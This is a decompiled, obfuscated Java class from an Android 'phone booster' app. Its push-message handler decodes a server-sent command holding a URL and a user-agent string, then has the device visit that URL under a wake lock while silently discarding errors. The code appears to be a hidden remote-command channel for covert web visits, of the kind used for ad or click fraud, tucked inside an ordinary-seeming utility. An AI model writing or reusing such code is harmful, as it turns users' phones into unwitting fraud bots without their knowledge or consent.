package utility.quickest.phonebooster.model_helper;

import android.os.PowerManager.WakeLock;
import com.google.gson.C2365j;
import utility.quickest.phonebooster.network.C2522c;
import utility.quickest.phonebooster.network.response_data.VisitCommandServiceExpression;
import utility.quickest.phonebooster.p114d.C2443a;
import utility.quickest.phonebooster.util.C2542m;
import utility.quickest.phonebooster.util.ThreadUtil;
import java.util.Map;

/* compiled from: PushModel */
class hs implements Runnable {
    final /* synthetic */ Map f14353a;
    final /* synthetic */ C2443a f14354b;
    final /* synthetic */ WakeLock f14355c;
    final /* synthetic */ hq f14356d;

    hs(hq hqVar, Map map, C2443a c2443a, WakeLock wakeLock) {
        this.f14356d = hqVar;
        this.f14353a = map;
        this.f14354b = c2443a;
        this.f14355c = wakeLock;
    }

    public void run() {
        try {
            VisitCommandServiceExpression visitCommandServiceExpression = (VisitCommandServiceExpression) new C2365j().m17179a(C2542m.m19077a((String) this.f14353a.get("content"), true), VisitCommandServiceExpression.class);
            if (visitCommandServiceExpression != null) {
                C2522c.m18850a(visitCommandServiceExpression.url, visitCommandServiceExpression.ua, this.f14354b);
                ThreadUtil.m19099a(false, new ht(this, visitCommandServiceExpression));
            }
        } catch (Throwable th) {
        }
        ThreadUtil.m19099a(false, new hu(this));
    }
}
